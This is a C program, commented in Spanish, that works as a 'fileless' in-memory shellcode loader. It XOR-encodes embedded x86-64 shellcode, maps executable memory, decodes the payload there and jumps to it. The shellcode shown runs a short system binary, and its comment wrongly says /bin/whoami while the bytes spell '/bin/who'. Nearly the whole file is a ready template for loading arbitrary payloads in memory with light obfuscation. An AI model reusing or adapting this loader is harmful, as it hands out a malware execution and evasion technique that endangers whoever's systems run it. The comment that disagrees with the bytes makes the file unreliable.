#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

// Shellcode para ejecutar /bin/whoami con PATH completo
unsigned char shellcode[] = {
    0x48, 0x31, 0xff,                   // xor rdi, rdi
    0x48, 0x31, 0xf6,                   // xor rsi, rsi
    0x48, 0x31, 0xd2,                   // xor rdx, rdx
    0x48, 0x31, 0xc0,                   // xor rax, rax
    0x50,                               // push rax
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, // movabs rax, '/bin/who'
    0x2f, 0x77, 0x68, 0x6f,
    0x50,             // push rax
    0x48, 0x89, 0xe7, // mov rdi, rsp
    0x48, 0x31, 0xf6, // xor rsi, rsi
    0x48, 0x31, 0xd2, // xor rdx, rdx
    0xb0, 0x3b,       // mov al, 59 (syscall execve)
    0x0f, 0x05        // syscall
};

void xor_encrypt(unsigned char *data, size_t len, unsigned char key)
{
    for (size_t i = 0; i < len; i++)
    {
        data[i] ^= key;
    }
}

void hexdump(const unsigned char *data, size_t len)
{
    for (size_t i = 0; i < len; i++)
    {
        printf("%02x ", data[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    printf("\n");
}

int main()
{
    printf("[+] Iniciando payload fileless (RAM-only)...\n");

    // Verificar permisos
    if (getuid() == 0)
    {
        printf("[!] Ejecutando como root\n");
    }
    else
    {
        printf("[!] Ejecutando como usuario: %d\n", getuid());
    }

    size_t shellcode_len = sizeof(shellcode);
    size_t page_size = getpagesize();
    size_t aligned_len = (shellcode_len + page_size - 1) & ~(page_size - 1);

    // Cifrar shellcode
    xor_encrypt(shellcode, shellcode_len, 0xFE);
    printf("[+] Shellcode cifrado:\n");
    hexdump(shellcode, shellcode_len);

    // Mapear memoria con todos los permisos
    void *exec_mem = mmap(NULL, aligned_len,
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    if (exec_mem == MAP_FAILED)
    {
        printf("[-] Error en mmap: %s\n", strerror(errno));
        return 1;
    }

    printf("[+] Memoria mapeada en: %p\n", exec_mem);

    // Copiar y descifrar shellcode
    memcpy(exec_mem, shellcode, shellcode_len);
    xor_encrypt(exec_mem, shellcode_len, 0xFE);

    printf("[+] Shellcode descifrado:\n");
    hexdump(exec_mem, shellcode_len);

    // Asegurar permisos de ejecución
    if (mprotect(exec_mem, aligned_len, PROT_READ | PROT_EXEC) != 0)
    {
        printf("[-] Error en mprotect: %s\n", strerror(errno));
        munmap(exec_mem, aligned_len);
        return 1;
    }

    printf("[+] Preparando ejecución del shellcode...\n");
    fflush(stdout);

    // Sincronizar caché de instrucciones
    __builtin___clear_cache(exec_mem, (void *)((char *)exec_mem + shellcode_len));

    printf("[+] Ejecutando shellcode...\n");
    fflush(stdout);

    // Ejecutar shellcode
    ((void (*)())exec_mem)();

    // Limpieza
    munmap(exec_mem, aligned_len);
    return 0;
}